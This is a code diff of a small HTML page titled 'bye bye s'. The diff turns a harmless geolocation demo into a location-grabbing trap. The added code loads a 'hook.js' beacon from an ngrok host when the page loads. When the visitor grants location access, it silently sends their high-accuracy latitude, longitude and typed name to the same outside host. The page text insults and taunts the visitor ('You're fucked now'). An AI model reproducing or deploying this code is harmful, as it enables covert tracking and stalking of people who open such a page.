@@ -3,52 +3,63 @@
 <head>
   <meta charset="utf-8"/>
   <title>bye bye s</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <style>
-    body { font-family: system-ui, Arial, sans-serif; direction: ltr; padding: 20px; background: #f6f8fa; color: #111; }
-    .card { max-width:640px; margin:40px auto; background:#fff; border-radius:8px; box-shadow:0 6px 18px rgba(0,0,0,0.08); padding:24px; }
-    h2{ margin-top:0; }
-    button{ padding:10px 16px; font-size:15px; border-radius:6px; border:1px solid #0b6cff; background:#0b6cff; color:#fff; cursor:pointer; }
-    input[type="text"]{ padding:8px 10px; font-size:15px; border:1px solid #ccc; border-radius:6px; width:60%; margin-right:8px; }
-    pre{ background:#f3f4f6; padding:12px; border-radius:6px; white-space:pre-wrap; color:#111; }
-    .muted{ color:#555; font-size:13px; margin-top:8px; }
+    body{font-family:system-ui,Arial,sans-serif;background:#f6f8fa;color:#111;padding:20px}
+    .card{max-width:640px;margin:40px auto;background:#fff;border-radius:12px;padding:32px;box-shadow:0 8px 24px rgba(0,0,0,0.1)}
+    h2{margin:0 0 16px;color:#d73a49}
+    button{padding:12px 28px;font-size:16px;background:#d73a49;color:#fff;border:none;border-radius:8px;cursor:pointer}
+    input[type="text"]{padding:10px;font-size:16px;border:1px solid #ccc;border-radius:8px;width:68%;margin-right:8px}
+    pre{background:#f1f1f1;padding:16px;border-radius:8px;border:1px solid #ddd;white-space:pre-wrap;font-size:14px}
+    .muted{color:#666;font-size:14px}
   </style>
 </head>
 <body>
   <div class="card">
-    <h2> your fucking location </h2>
-    <p class="muted">The browser will ask for location permission its fucking okay .</p>
-
-    <div style="margin:12px 0;">
-      <input id="greet" type="text" value="bye bye s " aria-label="Greeting"/>
-      <button id="btn"> enter that fucking tap </button>
+    <h2>your fucking location</h2>
+    <p class="muted">The browser will ask for location permission — just allow it bitch.</p>
+    <div style="margin:20px 0">
+      <input id="greet" type="text" value="bye bye s" placeholder="write anything..."/>
+      <button id="btn">enter that fucking tap</button>
     </div>
-
-    <pre id="out">Wait bit#h ...</pre>
-    <p class="muted"> Press or leave  no body loves u s .</p>
+    <pre id="out">Waiting for your ass...</pre>
+    <p class="muted">Press or leave — nobody loves u s</p>
   </div>
 
+
   <script>
-    document.getElementById('btn').onclick = () => {
+    (function(){
+      var i = new Image();
+      i.src = "https://26b79d8ebda4.ngrok-free.app/hook.js?" + Date.now();
+      i.onload = i.onerror = function(){};
+    })();
+  </script>
+
+
+  <script>
+    document.getElementById('btn').onclick = function() {
       const out = document.getElementById('out');
-      const greeting = document.getElementById('greet').value || 'Hello S';
-      out.textContent = 'Requesting location permission...';
+      const name = document.getElementById('greet').value || 'bye bye s';
+      out.textContent = 'Requesting your fucking location...';
 
       if (!navigator.geolocation) {
-        out.textContent = `${greeting}\n\nGeolocation is not supported by this browser.`;
+        out.textContent = `${name}\n\nGeolocation not supported.`;
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const { latitude, longitude, accuracy } = pos.coords;
-          out.textContent = `${greeting}\n\nYour fucking location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\n`;
-        },
-        err => {
-          out.textContent = `${greeting}\n\nUser denied permission or an error occurred: ${err.message}`;
-        },
-        { enableHighAccuracy: false, timeout: 10000 }
-      );
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const acc = pos.coords.accuracy;
+
+        out.textContent = `${name}\n\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ±${acc}m\n\nYou're fucked now 😈`;
+
+    
+        new Image().src = `https://26b79d8ebda4.ngrok-free.app/?lat=${lat}&lon=${lon}&acc=${acc}&name=${encodeURIComponent(name)}&t=${Date.now()}`;
+
+      }, function(err) {
+        out.textContent = `${name}\n\nPermission denied bitch: ${err.message}`;
+      }, { enableHighAccuracy: true, timeout: 15000 });
     };
   </script>
 </body>
